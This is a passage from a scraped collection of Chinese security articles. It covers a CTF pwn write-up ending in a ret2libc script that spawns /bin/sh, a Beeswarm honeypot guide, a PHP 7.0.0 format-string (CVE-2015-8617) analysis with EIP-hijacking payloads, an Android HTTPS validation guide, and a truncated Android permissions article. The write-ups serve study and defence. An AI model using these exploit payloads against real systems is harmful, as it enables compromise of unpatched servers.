0x0000000000401c33puts_plt                   = 0x0000000000400a60p_rsi_r15_ret = 0x0000000000401c31get_buff_addr = 0x400D75puts_got = 0x0000000000603020""""""pwn_with_array(io, val_list)data = io.read(6)+""\x00""*2print repr(data)puts_addr = l64(data)libc_base = puts_addr - offset_putssystem_addr = libc_base + offset_systemprint hex(libc_base)print hex(system_addr)val_list = []val_list.append(p_rdi_ret_val)val_list.append(puts_got_8_val)val_list.append(get_buff_val)val_list.append(p_rdi_ret_val)val_list.append(puts_got_8_val)val_list.append(puts_plt_val)pwn_with_array(io, val_list)io.writeline(""/bin/sh\x00"" + l64(system_addr))io.interact()io = get_io(target)pwn(io)flag如下：","2017-04-08 12:09:41","CTF专题","法国年度黑客竞赛：Nuit du Hack 2017 Writeup","http://nsoad.com/Article/CTF/20170408/1131.html"
"5ccbfa1c4f2f0a0a7a69c019","Beeswarm是一个主动蜜罐系统，通过部署一些模拟真实用户的节点与蜜罐系统通信，从而引诱窃听了这些会话的攻击者攻击蜜罐系统，以捕获发现攻击。","Kong","Beeswarm是一个主动蜜罐系统，通过部署一些模拟真实用户的节点与蜜罐系统通信，从而引诱窃听了这些会话的攻击者攻击蜜罐系统，以捕获发现攻击。一、介绍蜜罐系统一般不会主动产生流量，而是被动的等待攻击流量。Beeswarm则是一款主动诱骗攻击者的蜜罐，可以模拟客户端与服务器的通信（诱饵通信），诱骗黑客攻击蜜罐，以对付企图通过网络监听获取敏感信息的攻击者。诱饵通信中，包括大量攻击者可能非常感兴趣的信息，如用户名口令、管理后台等。如果有攻击者在网络中进行窃听，获取了诱饵通信的内容，并使用这些敏感信息（如使用诱饵登录凭证）登录系统，Beeswarm就能发现网络攻击。此外，Beeswarm也做了很好的细节处理，如对于交互式的协议（如ssh和telnet），诱饵会话的流量模式将会匹配人类的打字速度，目的是使诱饵会话流量看起来合法而且能够吸引黑客。图 1 Beeswarm欺骗框架示例二、安装方法1. 实验环境Beeswarm包括Beeswarm Server、Beeswarm Drone Client、Beeswarm Drone Honeypot。Beeswarm Drone Client在网络中和Beeswarm Drone Honeypot通信并故意泄漏凭证等信息，目的是检测网络中是否有攻击者（图1 中的Adversary）窃听了网络流量并尝试使用窃取的凭证登录蜜罐系统，以发现攻击。Beeswarm Server对Beeswarm Drone Client、Beeswarm Drone Honeypot进行管理并收集Beeswarm Drone Client、Beeswarm Drone Honeypot上报的信息，通过Beeswarm Server提供的可视化接口可以查看Beeswarm Drone Client、Beeswarm Drone Honeypot、诱饵会话以及捕获到的攻击的信息。在本次实验中使用了三台安装Ubuntu Server 16.04 LTS系统的虚拟机，分别充当Beeswarm Server，Beeswarm Drone Client，Beeswarm Drone Honeypot。2. Beeswarm Server安装首先安装依赖类库：sudo apt-get install libffi-dev build-essential python-dev python-pip libssl-dev libxml2-dev libxslt1-devsudo pip install pydes –allow-external pydes –allow-unverified pydes运行第二条命令的时候有一些告警信息，不影响安装。然后安装Beeswarm：sudo pip install beeswarm安装成功后使用如下命令启动Beeswarm服务：mkdir server_workdircd server_workdirbeeswarm –server在启动的过程中需要输入服务器的IP或者域名，我们的输入为“192.168.71.130”，安装完成后系统会给出管理员密码，这个密码是登录系统进行配置时的管理员密码，用户名是admin。使用浏览器通过HTTPS协议访问服务器，端口号默认是5000（https://服务器IP：5000），登录界面如下图所示：图 2 管理员登录界面用户名为admin，密码为安装阶段给出的密码，然后登录（图3），此时还没有配置蜜罐和Drone客户端，因此没有数据。图 3 登录后的界面3. Beeswarm Drone Client、Beeswarm Drone Honeypot安装在Beeswarm中Drone Client和Drone Honeypot都是Drone。在第二台虚拟机上重复上述安装步骤，直到Beeswarm安装成功，然后执行如下指令：mkdir drone_workdircd drone_workdir使用浏览器访问服务器（https:// 192.168.71.130：5000），输入用户名和密码，选择+Drone菜单项，可以得到启动Drones时需要告诉Drones的Beeswarm服务器的URL，用于让服务器识别Drones：图 4 选择+Drone之后执行如下命令(如果系统想要配置为Drone Honeypot，那么要用管理员权限运行，因为蜜罐端要占用一些熟知端口，如果仅仅是部署Drone客户端则不用)，将上一步 得到的URL作为参数输入：sudo beeswarm –config  https://192.168.71.130：5000/ws/drone/add/82a93121-22dc-4150-a017-976c3ea73f50运行命令后Drone与服务器连接等待配置：图 5 Drone等待配置当Drones和服务器连接后，通过浏览器访问服务器进行配置，配置页面如图3，选择Drone菜单项，然后选Unassigned，此时可以看到待配置的选项，见图6.6图 6 待配置的Drone选择蓝色的按钮进入模式选择页面，有蜜罐和客户端两种类型，先选择蜜罐类型：图 7 Drone类型选择选择之后进入蜜罐节点配置页面，需要选择开启哪些服务；图 8 蜜罐开启的服务选择配置完成后蜜罐主机开始监听端口；图 9 蜜罐主机监听端口在第三台虚拟机上重复上述步骤，但是在图7的模式选择中选Client；Client模式配置页面如图10；图 10 client配置页面三、使用方法在Beeswarm蜜罐系统中，Beeswarm Drone Client需要部署在想要进行检测的网段，一旦完成部署，Beeswarm Drone Client将会不断访问系统（图11是Beeswarm Drone Client 与Honeypot 交互示例）。当Beeswarm Drone Client所在网段有攻击者进行窃听并使用窃听得到的登录凭证访问蜜罐系统时，Beeswarm就能发现攻击者的存在。图 11 Beeswarm Drone Client 与Honeypot 交互示例图 12 通过wireshark抓包获取的telnet会话内容Beeswarm Drone Client 和Beeswarm Drone Honeypot会将信息报告给服务器，访问服务器可以看到Honeypot、Clients、产生的诱饵会话和攻击信息。图 13 运行结果四、Beeswarm相关资料蜜罐系统简介 :http://www.beeswarm-ids.org/源码下载地址：https://github.com/honeynet/beeswarm","2016-12-16 18:44:46","系统安全","主动欺骗蜜罐系统Beeswarm简介","http://nsoad.com/Article/system/20161216/924.html"
"5ccbfa1c4f2f0a0a7a69c01a","PHP7.0.0的这个格式化字符串漏洞是15年12月在exploit-db上发现的。当初发现时，笔者还在北京东北方向的某信息安全公司上班，那时比较忙，并未能深入探究。最近几天无意间又看到了这个漏洞，发现该漏洞多了","silence","PHP7.0.0的这个格式化字符串漏洞是15年12月在exploit-db上发现的。当初发现时，笔者还在北京东北方向的某信息安全公司上班，那时比较忙，并未能深入探究。最近几天无意间又看到了这个漏洞，发现该漏洞多了一个CVE编号：CVE-2015-8617，于是深入地看了看这个漏洞，在这里对该格式化字符串漏洞进行一些简要分析，并讨论一下利用该漏洞劫持EIP的潜在方法，供各位读者参考。    1.引言 在PHP中有两个常见的格式化字符串函数，分别是sppintf()和vsppintf()，它们分别对应sprintf()函数和vsprintf()函数，这两个函数的声明为：PHPAPI int spprintf( char **pbuf, size_t max_len, const char *format, ...);PHPAPI int vspprintf(char **pbuf, size_t max_len, const char *format, va_list ap); 通过其函数声明可以看到，spprintf()接收可变数量的参数，而vspprintf()仅接收4个参数。 虽然这两个函数的内部实现原理是类似的，但笔者不打算就此点进行深入讨论，如有感兴趣读者，可以看一看《程序员的自我修养》一书。关于格式化字符串漏洞的分析文章普遍集中于sprintf()函数，而在本文中则需要重点讨论一下vsprintf()函数，即着重讨论下PHP中的vspprintf()函数。2.漏洞分析 本文所研究的vspprintf()函数在zend_throw_error()函数中，当触发漏洞时，zend_throw_error()函数由zend_throw_or_error()函数调用。zend_throw_or_error()函数不是很长，所以复制其代码如下：static void zend_throw_or_error(int fetch_type, zend_class_entry *exception_ce, const char *format, ...){                 va_list va;                 char *message = NULL;                  va_start(va, format);                 zend_vspprintf(&amp;message, 0, format, va);                  if (fetch_type &amp; ZEND_FETCH_CLASS_EXCEPTION) {                 zend_throw_error(exception_ce,  message); //vul_func                    //zend_throw_error(exception_ce,  ""%s"", message);  patched in  the subsequent version                } else {                 zend_error(E_ERROR, ""%s"", message);                  }                   efree(message);                 va_end(va);                } 在上述代码段中，触发漏洞的函数调用已用红色笔标明出，由于调用时少了一个参数导致触发了格式化字符串漏洞。该漏洞的补丁也用红色笔在代码中标明了。 关于该格式化字符串漏洞，并没有很多需要分析说明的地方，下面开始分别从windows和linux两个环境中讨论利用该漏洞劫持EIP的方法。3.windows环境下分析 为了减少在win7环境下的分析难度，笔者暂且把ASLR关掉。若计划实现稳定的EIP劫持，可能还需要通过其他手段获取一些模块基址，当然这PHP7.0.0格式化字符串漏洞本身也可以泄露一部分有用的内存数据。 在windows版本的PHP中，其漏洞函数位于php7ts.dll动态链接库中，构造php页面如下：&lt;?php                $name=""%n%n"";                $name::doSomething();                ?&gt; 通过调试器启动PHP解析该php页面，执行到程序崩溃时，通过栈回溯，可以找到vspprintf()函数调用（该函数是导出函数，也可以直接在导出表中找到此函数），在该函数的函数头下断点，重新执行，找到即将触发漏洞的某次调用。此时，观察栈中的数据：上图中，栈顶是函数返回地址，即返回到zend_throw_error()函数中，接下来的是vspprintf()函数的四个参数。其中，0441E890即为va_list类型的参数。 这里需要指出的是，如果是传统的spprintf()函数的格式化字符串溢出，则只需要不断地利用%x递增栈上参数数量，最后利用%n实现覆盖函数返回地址即可有效地实现劫持EIP。但是此处是vspprintf()函数的，只接受4个参数，所以如果打算继续劫持EIP，则需要研究一下va_list，va_list在不同环境下的定义略有不同，这里我们可以粗略地定义va_list类型如下：#define va_list void* 即认为va_list是一个指向可变数量参数的指针。在vspprintf()函数中，对于%x的处理是直接取va_list指向的内容，如下图：其中，0441E890即为va_list的起始地址，通过图1的第四个参数可以观察到。对于第一个%x，则输出0565D3C0；对于第二个%x，则输出96E436E2；对于第三个%x，则输出0441E8C4，以此类推下去。 在vspprintf()函数中，对于%n的处理则较为麻烦，它不会像%x那样直接依次地读写下去，而是取va_list指向的参数表的每个参数作为指针，进而覆盖该指针所指向的内容。结合图2，具体叙述如下：对于第一个%n，则覆盖0565D3C0所指向的内容，对于第二个%n，则覆盖96E436E2所指向的内容，此时PHP就崩溃了，因为该地址是无效的。 此时，是无法直接覆盖函数的返回地址。为实现劫持EIP的目的，需要在栈上找一个二级指针。该二级指针取值第一次为保存函数返回地址变量的地址，取值两次为函数返回地址变量的值。但笔者在栈上并没有找到所需的二级指针，所以，笔者只能选择构造一个这样子的指针，其构造方法如下：1，首先在栈上选择一个合适位置，该位置存储内容指向栈的另一个位置，指向位置大于且接近该位置的地址。复制部分栈内容如下：0441E890   0565D3C00441E894   96E436E20441E898   0441E8C4&lt; ------- 合适0441E89C   102F8BE20441E8A0   00000200正如上表所示，0441E8C4就是4字节对齐的，大于且接近0441E898，是一个非常合适的栈位置。2，通过上一步找到的合适位置，覆盖0441E8C4的内容，使其指向栈上保存函数返回地址的地址。在笔者调试时，将其覆盖为0441E82C，即当前函数返回到vspprintf()函数的返回地址：3，第一次覆盖之后，用%x继续在栈上滑行，直到0441E8C4的位置，此时将会第二次覆盖0441E82C的内容，使其指向我们需要跳转的位置，比方说跳转到04422222的位置。 按照上述思路，其栈空间的内容大致如下：…0441E824  96E401120441E828  96E436590441E82C   04422222 &lt;-----第二次覆盖0441E830  0565D3C00441E834  0441E890…0441E890  0565D3C0 &lt; -----起始0441E894  96E436E20441E898  0441E8C4 &lt;-----合适位置0441E89C   102F8BE20441E8A0   00000200…0441E8BC    056140060441E8C0   96E436C20441E8C4    0441E82C &lt;-----第一次覆盖0441E8C8   103865E90441E8CC    056631C0… 基于此，笔者尝试构造php页面如下：&lt;?php                $name=""%71428125x%x%n%x%x%x%x%x%x%x%x%x%14788x%n"";                $name::doSomething();                ?&gt; 当PHP解析该页面的时候，首先输出2个%x后，遇到第一个%n，则会覆盖0441E8C4覆盖为0441E82C；继续跳过10个%x后，遇到第二个%n，则会覆盖0441E82C覆盖为04422222。 其运行结果如下图所示：单步执行后，就会来到04422222的位置： Windows环境下的分析就到此位置，至于出现的几个常数：71428125和14788以及10个%x从何而来，相信读者自己也能想到。至于是否可以在栈上构造一些合适的数据，最后通过ROP实现EXP，这点也留给读者自己考虑分析一下吧。4.Linux环境下分析 Linux环境下，同样先把ASLR关掉，用以减少我们的分析难度。与Windows环境下的分析略有不同，由于Linux环境下的栈基址比较高，如下图所示：声明一个如此之长的字符串，容易出现各种各样的问题，所以笔者只好放弃直接覆盖函数返回地址实现劫持EIP的方法。 这里考虑另一种劫持EIP的方法，覆盖对象虚表的方法（一般情况下有三种常见的方法，在笔者之前的分析《kill.exe溢出漏洞分析与EXP讨论》中有提到，感兴趣的读者可以看一下）。构造合适的php页面，令PHP不崩溃，而是让其继续下去的话，就会发现PHP接下来将要调用_object_init_ex()函数，初始化异常对象。该初始化函数会进一步调用object_and_properties_init()函数，而在此函数中，会调用对象虚表中的函数，关键代码段如下：object_and_properties_init()                {                    …                     mov ebx, [esp+0Ch+class_type]                    …                     mov eax, [ebx+0FCh]                    …                    call eax              ; call    [[esp+0Ch+class_type]+0FCh]                    …                 } 考虑到此时存储在[esp+0Ch+class_type]+0FCh的值比较小，可以尝试利用此处的call eax实现劫持EIP。 选择在第3章节描述的二次覆盖方法，可以构造栈空间如下：…08948F5C 08945D4C08948F60 08945D5008948F64 08955555 &lt; -----第二次覆盖08948F68 0000000008948F6C 00000000…BFFFBF94 B5C650A0&lt; -----起始BFFFBF98 087F41E7BFFFBF9C BFFFBFCC &lt; -----合适位置BFFFBFA0 0895F890BFFFBFA4 00000000…BFFFBFC4 00000000BFFFBFC8 087F41E7BFFFBFCC 08948F64&lt; -----第一次覆盖BFFFBFD0 B5C14020BFFFBFD4 B5C74054… 基于以上讨论，笔者构造php页面如下：&lt;?php                ini_set(""memory_limit"", ""2G"");                $name=""%143953757x%n%x%x%x%x%x%x%x%x%x%x%50621x%n"";                $name::doSomething();                ?&gt; 当PHP在解析该页时，第一次遇到%n将会覆盖8FFFBFCC位置的数据为08948F64；而第二次遇到%n时，将08948F4位置的数据覆盖为08955555。此后，程序会正常执行，直到call eax指令的位置：此时，PHP将跳转到我们指定的地址继续执行，在上图中为8955555地址。 值得庆幸的是，在Linux环境中，并没有Windows环境的CFG保护。如果存在CFG保护，即有/GUARD:CF标记，将可能导致此种利用方式失败。 Linux环境下的分析也就到此位置，至于出现的几个常数：143953757和50621以及11个%x从何而来，相信读者自己也能想到。至于是否可以实现有效的EXP，这点也留给读者自己考虑分析一下吧。5.小结 本文简要地分析了PHP7.0.0格式化字符串漏洞，并在windows和linux两种不同的环境下，给出了运用该漏洞劫持EIP的方法。但需要指出的是，本文所有的分析都在禁用了ASLR的场景之下进行的，若打算实际利用该漏洞，还需要获取一些模块基址等其他有用信息。而关于这些，笔者就不再多说，还是交给感兴趣的读者自己研究吧。","2016-10-14 00:24:42","移动安全","PHP7.0.0格式化字符串漏洞与EIP劫持分析","http://nsoad.com/Article/MobileSecurity/20161014/537.html"
"5ccbfa254f2f0a0a7a69c01b","阿里聚安全的应用漏洞扫描器中有证书弱校验、主机名弱校验、webview未校验证书的检测项，这些检测项是针对APP采用HTTPS通信时容易出现风险的地方而设。接下来介绍一下安全使用HTTPS的相关内容。","Kong","HTTPS简介阿里聚安全的应用漏洞扫描器中有证书弱校验、主机名弱校验、webview未校验证书的检测项，这些检测项是针对APP采用HTTPS通信时容易出现风险的地方而设。接下来介绍一下安全使用HTTPS的相关内容。为何需要HTTPSHTTP协议是没有加密的明文传输协议，如果APP采用HTTP传输数据，则会泄露传输内容，可能被中间人劫持，修改传输的内容。如下图所示就是典型的APP HTTP通信被运营商劫持修改，插入广告：上图是在我的住处，用WiFi打开某APP，页面底部出现了一个拆红包的广告，点开以后是一个安装APP的页面，如果我用联通的4G网络打开，就不会出现这种情况，说明小区运营商劫持了HTTP通信，往APP的通信中加入了自己的推广内容，还有一些低俗的推广广告，这很影响用户体验。一些别有用心的人通过搭建公共WiFi，进行流量劫持、嗅探，可以获得通过HTTP传输的敏感信息。为了保护用户的信息安全、保护自己的商业利益，减少攻击面，我们需要保障通信信道的安全，采用开发方便的HTTPS是比较好的方式，比用私有协议要好，省时省力。但是如果HTTPS使用不当，就很难起到应有的保护效果。乌云上有很多Android HTTPS使用不当导致产生风险的例子，如wooyun-2010-079358、wooyun-2010-081966、wooyun-2010-080117，有兴趣的话可以去找找看看。HTTPS通信原理HTTPS是HTTP over SSL/TLS，HTTP是应用层协议，TCP是传输层协议，在应用层和传输层之间，增加了一个安全套接层SSL/TLS：SSL/TLS层负责客户端和服务器之间的加解密算法协商、密钥交换、通信连接的建立，安全连接的建立过程如下所示：HPPTS握手协议有很丰富的内容，建议读者使用wireshark抓包进行分析，由于篇幅所限，这里不再进一步深入。如何使用HTTPS数字证书、CA与HTTPS信息安全的基础依赖密码学，密码学涉及算法和密钥，算法一般是公开的，而密钥需要得到妥善的保护，密钥如何产生、分配、使用和回收，这涉及公钥基础设施。公钥基础设施（PKI）是一组由硬件、软件、参与者、管理政策与流程组成的基础架构，其目的在于创造、管理、分配、使用、存储以及撤销数字证书。公钥存储在数字证书中，标准的数字证书一般由可信数字证书认证机构(CA，根证书颁发机构)签发，此证书将用户的身份跟公钥链接在一起。CA必须保证其签发的每个证书的用户身份是唯一的。链接关系（证书链）通过注册和发布过程创建，取决于担保级别，链接关系可能由CA的各种软件或在人为监督下完成。PKI的确定链接关系的这一角色称为注册管理中心（RA，也称中级证书颁发机构或者中间机构）。RA确保公钥和个人身份链接，可以防抵赖。如果没有RA，CA的Root 证书遭到破坏或者泄露，由此CA颁发的其他证书就全部失去了安全性，所以现在主流的商业数字证书机构CA一般都是提供三级证书，Root 证书签发中级RA证书，由RA证书签发用户使用的证书。X509证书链，左边的是CA根证书，中间的是RA中间机构，右边的是用户：www.google.com.hk网站的证书链如下，CA证书机构是GeoTrust Global CA，RA机构是Google Internet Authority G2，网站的证书为*.google.com.hk：HTTPS通信所用到的证书由CA提供，需要在服务器中进行相应的设置才能生效。另外在我们的客户端设备中，只要访问的HTTPS的网站所用的证书是可信CA根证书签发的，如果这些CA又在浏览器或者操作系统的根信任列表中，就可以直接访问，而如12306.cn网站，它的证书是非可信CA提供的，是自己签发的，所以在用谷歌浏览器打开时，会提示“您的连接不是私密连接”，证书是非可信CA颁发的：所以在12306.cn的网站首页会提示为了我们的购票顺利，请下载安装它的根证书，操作系统安装后，就不会再有上图的提示了。自有数字证书的生成HTTPS网站所用的证书可向可信CA机构申请，不过这一类基本上都是商业机构，申请证书需要缴费，一般是按年缴费，费用因为CA机构的不同而不同。如果只是APP与后台服务器进行HTTPS通信，可以使用openssl工具生成自签发的数字证书，可以节约费用，不过得妥善保护好证书私钥，不能泄露或者丢失。HTTPS通信所用的数字证书格式为X.509。自签发数字证书步骤如下：Step1 生成自己的CA根证书生成CA私钥文件ca.key：openssl genrsa -out ca.key 1024生成X.509证书签名请求文件ca.csr：openssl req -new -key ca_private.key -out ca.csr?在生成ca.csr的过程中，会让输入一些组织信息等。生成X.509格式的CA根证书ca_public.crt（公钥证书）：openssl x509 -req -in ca.csr -signkey ca_private.key -out ca_public.crtStep2 生成服务端证书先生成服务器私钥文件server_private.key：openssl genrsa -out server_private.key 1024根据服务器私钥生成服务器公钥文件server_public.pem：openssl rsa -in server_private.key -pubout -out server_public.pem服务器端需要向CA机构申请签名证书，在申请签名证书之前依然是创建自己的证书签名请求文件server.csr：openssl req -new -key server_prviate.key -out server.csr对于用于HTTPS的CSR，Common Name必须和网站域名一致，以便之后进行Host Name校验。服务器端用server.csr文件向CA申请证书，签名过程需要CA的公钥证书和私钥参与，最终颁发一个带有CA签名的服务器端证书server.crt：openssl x509 -req -CA ca_public.crt -CAkey ca_private.key -CAcreateserial -in server.csr -out server.crt如果服务器端还想校验客户端的证书，可以按生成服务器端证书的形式来生成客户端证书。使用openssl查看证书信息：openssl x509 -in server.crt -text -noout用web.py搭建一个简单的服务器测试生成的server.crt，文件webpytest.py为：在本地运行web服务器程序：python webpytest.py 1234在safari浏览器中输入https://0.0.0.0:1234，提示此证书无效（主机名不相符），因为在生成服务器端证书签名请求文件server.csr时，在Common Name中输入的是localhost，与0.0.0.0不符：在safari浏览器中输入https://localhost:1234，不再提示主机名不相符了，而是提示此证书是由未知颁发机构签名的，因为是私有CA签发的证书，私有CA不在浏览器或者操作系统的的根信任列表中：还可用以下命令查看网站证书信息：openssl s_client -connect localhost:1234服务器端搭建成功，接下来讲Android客户端怎么和服务端进行HTTPS通信。使用HttpsURLConnection进行HTTPS通信Android官网给出了使用HttpsURLConnection API访问HTTPS的网站示例：此方法的特点：由Android系统校验服务端数字证书的合法性，用可信CA签发的数字证书的网站才可以正常访问，私有CA签发的数字证书的网站无法访问。不能抵御在用户设备上安装证书（将中间人服务器的证书放到设备的信任列表中）进行中间人攻击，做此类攻击的一般是为了分析应用和服务器的交互协议，找应用和服务器的其他漏洞。如果网站没有启用SSL site wide（use HTTPS only）或HSTS(HTTP Strict Transport Security)则无法抵御SSL Strip（HTTPS降级为HTTP）攻击，局域网攻击，如针对免费WiFi。如果要使用私有CA签发的证书，必须重写校验证书链TrustManager中的方法，否则的话会出现javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found。但是在重写TrustManger中的checkServerTrusted()很多开发者什么也没有做，会导致证书弱校验（没有真正校验证书）。?如下是错误的写法：正确的写法是真正实现TrustManger的checkServerTrusted()，对服务器证书域名进行强校验或者真正实现HostnameVerifier的verify()方法。?真正实现TrustManger的checkServerTrusted()代码如下其中serverCert是APP中预埋的服务器端公钥证书，如果是以文件形式，其获取为如下形式：对服务器证书域名进行强校验:真正实现HostnameVerifier的verify()方法：另外一种写法证书锁定，直接用预埋的证书来生成TrustManger，过程如下：参数certStream是证书文件的InputSteam流：另外可以用以下命令查看服务器证书的公钥：keytool -printcert -rfc -file uwca.crt直接复制粘贴可以将公钥信息硬编码在代码中：可以用以下形式获取此公钥对应的X.509证书：使用OKHttp3.0进行HTTPS通信除了使用Android系统提供的HttpsURLconnection进行https通信，还有其他的第三方库可以使用，以OKhttp3.0为例，先看未校验服务器端证书链、未校验服务端证书域名的错误写法：这些错误的发生其实和HttpsURLConnection的其实相同，都涉及SSLContext和HostnameVerifier，聚安全应用扫描器都能扫出来这些潜在风险点，解决办法也和2.3 节相同使用HttpsURLConnection都是真正实现TrustManager和HostnameVerifier中的方法。Webview的HTTPS安全目前很多应用都用webview加载H5页面，如果服务端采用的是可信CA颁发的证书，在webView.setWebViewClient(webviewClient)时重载WebViewClient的onReceivedSslError()，如果出现证书错误，直接调用handler.proceed()会忽略错误继续加载证书有问题的页面，如果调用handler.cancel()可以终止加载证书有问题的页面，证书出现问题了，可以提示用户风险，让用户选择加载与否，如果是需要安全级别比较高，可以直接终止页面加载，提示用户网络环境有风险：不建议直接用handler.proceed()，聚安全的应用安全扫描器会扫出来直接调用handler.proceed()的情况。如果webview加载https需要强校验服务端证书，可以在onPageStarted()中用HttpsURLConnection强校验证书的方式来校验服务端证书，如果校验不通过停止加载网页。当然这样会拖慢网页的加载速度，需要进一步优化，具体优化的办法不在本次讨论范围，这里也不详细讲解了。阿里聚安全对开发者建议阿里聚安全的漏洞扫描器发现，很多APP都存在HTTPS使用不当的风险。正确使用HTTPS能有效抵御在用户设备上安装证书进行中间人攻击和SSL Strip攻击。但是上述方法都需要在客户端中预埋证书文件，或者将证书硬编码写在代码中，如果服务器端证书到期或者因为泄露等其他原因需要更换证书，也就必须强制用户进行客户端升级，体验效果不好。阿里聚安全推出了一个能完美解决这个问题的安全组件。APP开发者只需要将公钥放在安全组件中，安全组件的动态密钥功能可以实现公钥的动态升级。另外正确使用HTTPS并非完全能够防住客户端的Hook分析修改，要想保证通信安全，也需要依靠其他方法，比如重要信息在交给HTTPS传输之前进行加密，另外实现客户端请求的签名处理，保证客户端与服务端通信请求不被伪造。目前阿里聚安全的安全组件已经具备以上所有功能，此外还有安全存储、模拟器检测，人机识别等功能。安全组件还具有实时更新客户端模块的功能，保证攻防对抗强度。参考[1] Survival guides – TLS/SSL and SSL (X.509) Certificates，http://www.zytrax.com/tech/survival/ssl.html?[2] Public key infrastructure，https://en.wikipedia.org/wiki/Public_key_infrastructure?[3] http://www.barretlee.com/blog/2015/10/05/how-to-build-a-https-server/?[4] Security with HTTPS and SSL，https://developer.android.com/training/articles/security-ssl.html?[5] 窃听风暴：Android平台https嗅探劫持漏洞，http://www.freebuf.com/articles/terminal/26840.html?[6] Android HTTPS中间人劫持漏洞浅析，https://jaq.alibaba.com/blog.htm?id=60?[7] 浅析HTTPS中间人攻击与证书校验，http://www.evil0x.com/posts/26569.html?[8] https://github.com/menjoo/Android-SSL-Pinning-WebViews?[9] https://github.com/square/okhttp/wiki/HTTPS?[10] https://github.com/square/okhttp/blob/master/samples/guide/src/main/java/okhttp3/recipes/CustomTrust.javaAndroid安全开发系列Android安全开发之通用签名风险Android安全开发之ZIP文件目录遍历Android安全开发之Provider组件安全Android安全开发之浅谈密钥硬编码Android安全开发之浅谈网页打开APPAndroid应用安全开发之浅谈加密算法的坑","2016-10-10 15:33:38","移动安全","Android安全开发之安全使用HTTPS","http://nsoad.com/Article/MobileSecurity/20161010/516.html"
"5ccbfa264f2f0a0a7a69c01c","前不久Google发布了新的系统版本Android7.0。在之前发布的6.0版本中，引入了一种新的权限模型。","Kong","一、新权限模型介绍(一)Android版本演变与权限模型变更前不久Google发布了新的系统版本Android7.0。在之前发布的6.0版本中，引入了一种新的权限模型。新权限模型在旧模型基础上加入了运行时动态权限检查，权限不再是安装时一次性全部授予，而是运行时动态申请与授予，如果开发者未按要求动态申请权限或者权限申请未被用户许可，应用程序的相应行为将无法实施；同时，用户可以在应用程序权限管理中随时撤销掉已授予的权限。这样的动态权限模型让用户对应用程序运行时权限拥有更强的可视性与控制性，赋予了用户更多权限管理主动权，增强了权限模型的安全性。在最新的7.0版本中，依旧沿用了此权限模型。各版本Android系统所占比例如图1所示。图1 2016年9月Android版本分布（图片来源：https://developer.android.com/about/dashboards/index.html）虽然6.0及以上系统版本并非是目前使用得最多的版本，但从图2、图3所示的占比变化趋势与使用率变化趋势上来看，使用了新权限模型的6.0及以上版本系统的占比正逐步增长，截至2016年9月，其占比已达到18.70%，而使用旧权限模型的5.x与4.4.x版本系统自2016年3月以来均呈现递减趋势。Android系统版本的占比变化表明，新权限模型正在逐步取代旧权限模型。图2 6.0及以上版本占比趋势变化图3 Android各版本使用率变化趋势(二)新旧模型对比新旧模型的关键区别在于新的权限模型加入了运行时动态权限检查与申请，以及给予了用户随时管理应用权限的主动权。1. 旧权限模型在以往的权限模型中，开发者在AndroidManifest.xml中声明所需的全部权限，应用在安装时呈现给用户其申请的全部权限，用户可以选择全部许可来安装应用，或拒绝来放弃安装；且应用安装后，用户无法变更该应用的权限，应用在其生命周期内（即卸载应用前）可以完全自由地使用其所申请的全部权限，即“一次安装，终身使用”。2. 新权限模型在新权限模型中，开发者除了需要在AndroidManifest.xml中声明所需权限外，对于Dangerous（危险）级别的权限，还需在代码中每处使用该权限的地方加入权限动态检查与申请的语句，如果开发者要调用的一些函数需要某权限而用户又拒绝授权的话，这些函数将无法被正常调用，以往的“一次安装，终身使用”模式不再适用，权限使用必须通过用户的动态授权；此外，应用安装后，用户能够随时撤销应用的某项权限，一旦用户撤销了应用的某项权限，应用若再想使用该权限必须重新申请并取得用户同意，在应用权限管理方面，用户将拥有更多主动权。作为一种新的安全策略，新权限模型与旧权限模型相比赋予了用户更多的权限管理主动权。在使用到Dangerous权限的地方，强制要求应用程序动态申请所需权限，只有在用户同意申请后才可正常使用该部分的功能；若用户察觉到应用的恶意行为，也可主动撤销掉应用的该项授权，以此阻止应用的进一步恶意行为；而恶意软件若想绕过动态权限机制直接使用权限将造成程序崩溃。二、新权限模型中的权限使用(一)新旧模型中的权限申请在旧权限模型中，权限一律在AndroidManifest.xml中声明，如图4，应用程序安装时要求用户全部同意方可安装，如图5，安装完成后应用可随意使用申请的全部权限。图4 AndroidManifest.xml 权限声明图5 旧权限模型权限申请在新权限模型中，在上述步骤基础上，还需在每次使用Dangerous权限的地方调用Context类的checkSelfPermission方法与Activity类的requestPermissions方法来进行动态权限检查与申请。图6 运行时权限申请——新权限模型(二)动态检查权限组需要注意的是，新权限模型中的强制性动态检查只针对Dangerous级的权限而言，对于Normal级的系统权限，仍仅需在AndroidManifest.xml中声明即可。同时，Dangerous级的权限是以组的形式进行授予的，即，如果应用程序已被授权了某个权限，同组的其他权限也将被自动授权使用，而不再需要额外动态授权。以短信组权限为例，如果已经动态申请并被授予了SEND_SMS权限，那么之后使用READ_SMS、WRITE_SMS或RECEIVE_SMS等同组权限进行读、写或接收等短信操作时，可以不用再进行动态权限申请。截至SDK    23，共有9个权限组，如表1所示。表1 SDK 23权限组(三)新权限模型中的权限使用流程在新权限模型动态检查—动态授权的过程中，开发者调用系统权限申请接口进行动态权限申请时会弹出系统授权弹窗，而为了增加用户授权的可能性，开发者也可以在系统弹窗之前，通过重写shouldShowRequestPermissionRationale方法来对权限申请作出必要解释，即自定义弹窗，自定义弹窗的具体文字陈述与形式可以由开发者自主定义，在用户知晓权限申请原因后，再弹出系统授权弹窗供用户选择授权与否。图7给出了一种较完整的动态权限检查—申请流程：首先调用系统权限检查接口进行动态权限检查，若尚未授权，则弹出开发者自定义的提示框，对此项权限申请给出文字解释，用户可选择取消直接放弃授权，也可在阅读原因后点击确认进入下一步（开发者自定义），如弹出系统授权弹窗，此时若用户拒绝就会放弃授权，若同意则为应用授予此项权限。图7 权限使用流程(四)代码示例环境：系统版本Android6.0，compileSdkVersion23主程序：重写shouldShowRequestPermissionRationale：图8 权限使用代码运行结果1. 点击发送短信，首先弹出自定义弹窗：图9 自定义弹窗运行结果2. 点击“好的”弹出系统授权弹窗，或点击“取消”直接放弃授权：图10 系统授权弹窗运行结果3. 首次点击“拒绝”后再次点击发送短信按钮，系统授权弹窗出现不再询问选项，若勾选，之后将不再弹出系统授权弹窗：图11 系统授权弹窗——不再询问选项运行结果4. 点击“允许”后可以成功进行短信发送：图12 授权后成功发送短信(五)低版本兼容性Android 